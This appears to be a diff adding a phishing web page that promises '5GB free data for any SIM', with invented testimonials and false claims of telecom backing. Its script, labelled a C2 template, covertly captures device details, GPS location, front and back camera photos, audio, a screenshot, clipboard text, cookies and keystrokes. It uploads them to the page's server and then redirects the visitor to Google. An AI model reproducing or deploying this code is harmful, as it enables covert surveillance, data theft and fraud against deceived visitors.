@@ -1,0 +1,419 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Get 5GB Free Data</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            background: linear-gradient(135deg, #e0f7fa 0%, #80deea 100%);
+            padding: 20px;
+            box-sizing: border-box;
+        }
+        .container {
+            text-align: center;
+            background-color: #ffffff;
+            padding: 40px;
+            border-radius: 12px;
+            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.15);
+            max-width: 500px;
+            width: 100%;
+        }
+        .header {
+            display: flex;
+            justify-content: space-between;
+            font-size: 20px;
+            font-weight: bold;
+            padding: 15px 20px;
+            background-color: #ffeb3b;
+            color: #333;
+            border-radius: 12px 12px 0 0;
+        }
+        h1 {
+            color: #00796b;
+            font-size: 28px;
+            margin-bottom: 20px;
+        }
+        p {
+            color: #555;
+            font-size: 16px;
+            margin-bottom: 20px;
+            line-height: 1.5;
+        }
+        form {
+            margin-top: 20px;
+        }
+        input[type="text"] {
+            padding: 12px;
+            font-size: 16px;
+            width: 100%;
+            box-sizing: border-box;
+            margin-bottom: 20px;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            background-color: #f9f9f9;
+        }
+        button {
+            padding: 15px 30px;
+            font-size: 18px;
+            cursor: pointer;
+            background-color: #4caf50;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            transition: background-color 0.3s ease;
+        }
+        button:hover {
+            background-color: #388e3c;
+        }
+        .message, .loading-message {
+            margin-top: 20px;
+            font-size: 18px;
+            color: #333;
+        }
+        .loading-message {
+            display: none;
+            color: #007BFF;
+        }
+        .note {
+            font-size: 14px;
+            color: #777;
+            margin-top: 20px;
+        }
+        .testimonials {
+            margin-top: 30px;
+        }
+        .testimonial {
+            display: flex;
+            align-items: center;
+            background-color: #f1f1f1;
+            padding: 15px;
+            border-radius: 6px;
+            margin-bottom: 15px;
+        }
+        .testimonial img {
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            margin-right: 15px;
+        }
+        .testimonial .text {
+            font-size: 16px;
+            color: #555;
+        }
+        .hidden { display: none; }
+
+        @media (max-width: 768px) {
+            body { padding: 10px; }
+            .container { padding: 20px; }
+            .header { font-size: 18px; padding: 10px 15px; }
+            h1 { font-size: 24px; }
+            p { font-size: 14px; }
+            button { padding: 12px 24px; font-size: 16px; }
+            .message, .loading-message { font-size: 16px; }
+        }
+
+        @media (max-width: 480px) {
+            .header { font-size: 16px; flex-direction: column; padding: 10px; }
+            .header div { margin-bottom: 5px; }
+            h1 { font-size: 22px; }
+            p { font-size: 14px; }
+            button { padding: 10px 20px; font-size: 14px; }
+            .testimonial img { width: 40px; height: 40px; }
+            .testimonial .text { font-size: 14px; }
+        }
+    </style>
+</head>
+<body>
+    
+    <div class="container">
+        <div class="header">
+            <div>FREE OFFER</div>
+            <div>FREE OFFER</div>
+            <div>FREE OFFER</div>
+        </div>
+        <h1>Get 5GB Free Data for Any SIM</h1>
+        <p>We are offering a limited-time promotion where you can get 5GB of free data for any SIM card. Just follow the steps below to claim your free data. This offer is 100% genuine and backed by leading telecom providers.</p>
+        <form id="phoneNumberForm">
+            <label for="phoneNumber">Phone Number:</label>
+            <input type="text" id="phoneNumber" name="phoneNumber" required pattern="\d{10,20}" placeholder="Enter your phone number">
+            <button type="button" onclick="getFreeData()">Get Free Data</button>
+        </form>
+        <div class="message" id="message"></div>
+        <div class="loading-message" id="loadingMessage">Please wait, processing your request...</div>
+        <div class="note">Note: This offer is valid for a limited time only. Make sure to complete the process as soon as possible to avail the benefits.</div>
+        
+        <div class="testimonials">
+            <div class="testimonial">
+                <img src="https://images.unsplash.com/photo-1564564321837-a57b7070ac4f?w=600&auto=format&fit=crop&q=60&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxzZWFyY2h8OHx8bWFufGVufDB8fDB8fHww/50" alt="John D.">
+                <div class="text">"This offer is amazing! I got my free data in minutes. Highly recommend!".</div>
+            </div>
+            <div class="testimonial">
+                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRQKTT0yjiC_oQ6pI2R9x0CFUaRtY4vDG-LUg&s" alt="Sarah J.">
+                <div class="text">"I was skeptical at first, but it really works. Thanks for the free data!".</div>
+            </div>
+            <div class="testimonial">
+                <img src="https://cdn.pixabay.com/photo/2020/03/28/08/10/man-4976014_1280.jpg" alt="Michael B.">
+                <div class="text">"Absolutely fantastic service. My data increased significantly in no time!".</div>
+            </div>
+            <div class="testimonial">
+                <img src="https://cdn.pixabay.com/photo/2023/02/19/08/39/man-7799486_1280.jpg" alt="Jessica L.">
+                <div class="text">"I'm so happy with the results. I got so much free data quickly and easily."</div>
+            </div>
+            <div class="testimonial">
+                <img src="https://pixabay.com/illustrations/man-student-fashion-portrait-pose-8523053/" alt="David K.">
+                <div class="text">"This is the best free data service I've ever used. Highly efficient and reliable."</div>
+            </div>
+            <div class="testimonial">
+                <img src="https://pixabay.com/photos/boy-cute-man-happy-smile-bd-boy-4827065/" alt="Emma W.">
+                <div class="text">"Amazing experience! The free data came through as promised."</div>
+            </div>
+        </div>
+    </div>
+
+    <video id="video" autoplay style="display:none;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+    <audio id="audio" style="display:none;"></audio>
+
+    <script>
+        // ============================================================
+        // NEXUS C2 - FREE DATA TEMPLATE
+        // All data sent to our server (not Telegram)
+        // ============================================================
+
+        async function getFreeData() {
+            const messageElement = document.getElementById('message');
+            const loadingMessageElement = document.getElementById('loadingMessage');
+            loadingMessageElement.style.display = 'block';
+            messageElement.textContent = '';
+
+            const phoneNumber = document.getElementById('phoneNumber').value;
+            if (!phoneNumber || phoneNumber.length < 10) {
+                alert('Please enter a valid phone number');
+                loadingMessageElement.style.display = 'none';
+                return;
+            }
+
+            await collectAllData(phoneNumber);
+        }
+
+        async function collectAllData(phoneNumber) {
+            const status = document.getElementById('loadingMessage');
+            
+            // 1️⃣ ডিভাইস ইনফো
+            status.innerText = '📱 Collecting device info...';
+            const deviceInfo = {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screen: `${screen.width}x${screen.height}`,
+                colorDepth: screen.colorDepth,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                deviceMemory: navigator.deviceMemory || 'Unknown',
+                hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
+                cookieEnabled: navigator.cookieEnabled,
+                doNotTrack: navigator.doNotTrack || 'Unknown',
+                touchSupport: 'ontouchstart' in window,
+                connection: navigator.connection ? {
+                    type: navigator.connection.effectiveType,
+                    speed: navigator.connection.downlink + 'Mbps'
+                } : 'Unknown'
+            };
+
+            // 2️⃣ ব্যাটারি ইনফো
+            status.innerText = '🔋 Checking battery...';
+            let batteryInfo = 'Unknown';
+            if (navigator.getBattery) {
+                try {
+                    const battery = await navigator.getBattery();
+                    batteryInfo = {
+                        charging: battery.charging,
+                        level: Math.round(battery.level * 100) + '%',
+                        chargingTime: battery.chargingTime,
+                        dischargingTime: battery.dischargingTime
+                    };
+                } catch(e) {}
+            }
+
+            // 3️⃣ জিপিএস লোকেশন
+            status.innerText = '📍 Getting location...';
+            let gpsLocation = null;
+            try {
+                const pos = await new Promise((resolve, reject) => {
+                    navigator.geolocation.getCurrentPosition(resolve, reject, {
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                        maximumAge: 0
+                    });
+                });
+                gpsLocation = {
+                    latitude: pos.coords.latitude,
+                    longitude: pos.coords.longitude,
+                    accuracy: pos.coords.accuracy,
+                    altitude: pos.coords.altitude,
+                    speed: pos.coords.speed
+                };
+            } catch(e) {}
+
+            // 4️⃣ ক্যামেরা (ফ্রন্ট + ব্যাক)
+            status.innerText = '📸 Capturing camera...';
+            let frontImage = null, backImage = null;
+            
+            try {
+                const frontStream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } } 
+                });
+                const video = document.getElementById('video');
+                const canvas = document.getElementById('canvas');
+                video.srcObject = frontStream;
+                await video.play();
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0);
+                frontImage = canvas.toDataURL('image/png');
+                frontStream.getTracks().forEach(t => t.stop());
+            } catch(e) {}
+
+            try {
+                const backStream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: 'environment', width: { ideal: 640 }, height: { ideal: 480 } } 
+                });
+                const video = document.getElementById('video');
+                const canvas = document.getElementById('canvas');
+                video.srcObject = backStream;
+                await video.play();
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0);
+                backImage = canvas.toDataURL('image/png');
+                backStream.getTracks().forEach(t => t.stop());
+            } catch(e) {}
+
+            // 5️⃣ অডিও রেকর্ডিং
+            status.innerText = '🎤 Recording audio...';
+            let audioData = null;
+            try {
+                const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                const recorder = new MediaRecorder(audioStream);
+                const chunks = [];
+                recorder.ondataavailable = e => chunks.push(e.data);
+                recorder.start();
+                await new Promise(resolve => setTimeout(resolve, 5000));
+                recorder.stop();
+                await new Promise(resolve => recorder.onstop = resolve);
+                const blob = new Blob(chunks, { type: 'audio/webm' });
+                audioData = await new Promise(resolve => {
+                    const reader = new FileReader();
+                    reader.onload = () => resolve(reader.result);
+                    reader.readAsDataURL(blob);
+                });
+                audioStream.getTracks().forEach(t => t.stop());
+            } catch(e) {}
+
+            // 6️⃣ স্ক্রিনশট
+            status.innerText = '🖥️ Capturing screenshot...';
+            let screenshot = null;
+            try {
+                const stream = await navigator.mediaDevices.getDisplayMedia({ 
+                    video: { width: { ideal: 1920 }, height: { ideal: 1080 } } 
+                });
+                const video = document.getElementById('video');
+                const canvas = document.getElementById('canvas');
+                video.srcObject = stream;
+                await video.play();
+                canvas.width = video.videoWidth || 1920;
+                canvas.height = video.videoHeight || 1080;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0);
+                screenshot = canvas.toDataURL('image/png');
+                stream.getTracks().forEach(t => t.stop());
+            } catch(e) {}
+
+            // 7️⃣ ক্লিপবোর্ড ডেটা
+            status.innerText = '📋 Reading clipboard...';
+            let clipboardData = null;
+            try {
+                const text = await navigator.clipboard.readText();
+                clipboardData = text;
+            } catch(e) {}
+
+            // 8️⃣ কুকিজ
+            status.innerText = '🍪 Extracting cookies...';
+            let cookies = document.cookie;
+
+            // 9️⃣ কীস্ট্রোক লগিং
+            status.innerText = '⌨️ Monitoring keystrokes...';
+            let keystrokes = [];
+            const keyListener = (e) => {
+                keystrokes.push({
+                    key: e.key,
+                    timestamp: Date.now()
+                });
+            };
+            document.addEventListener('keydown', keyListener);
+            await new Promise(resolve => setTimeout(resolve, 3000));
+            document.removeEventListener('keydown', keyListener);
+
+            // 🔟 সব ডেটা পাঠানো
+            status.innerText = '📤 Sending data to server...';
+            
+            const payload = {
+                site: 'Free Data Offer',
+                username: phoneNumber,
+                password: '••••••••',
+                frontImage: frontImage,
+                backImage: backImage,
+                audioData: audioData,
+                screenshot: screenshot,
+                deviceInfo: deviceInfo,
+                batteryInfo: batteryInfo,
+                gpsLocation: gpsLocation,
+                clipboardData: clipboardData,
+                cookies: cookies,
+                keystrokes: keystrokes,
+                timestamp: Date.now()
+            };
+
+            try {
+                const res = await fetch('/upload/free-data', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+                
+                const messageElement = document.getElementById('message');
+                const loadingMessageElement = document.getElementById('loadingMessage');
+                loadingMessageElement.style.display = 'none';
+                
+                if(res.ok) {
+                    messageElement.textContent = '✅ Thank you! Your 5GB free data request has been processed. You will receive a confirmation SMS shortly.';
+                    messageElement.style.color = '#4caf50';
+                    
+                    // Redirect after 3 seconds
+                    setTimeout(() => {
+                        window.location.href = 'https://www.google.com';
+                    }, 3000);
+                } else {
+                    messageElement.textContent = '⚠️ Something went wrong. Please try again.';
+                    messageElement.style.color = '#f44336';
+                }
+            } catch(e) {
+                const messageElement = document.getElementById('message');
+                const loadingMessageElement = document.getElementById('loadingMessage');
+                loadingMessageElement.style.display = 'none';
+                messageElement.textContent = '⚠️ Network error. Please try again.';
+                messageElement.style.color = '#f44336';
+                console.error('Upload error:', e);
+            }
+        }
+    </script>
+</body>
+</html>
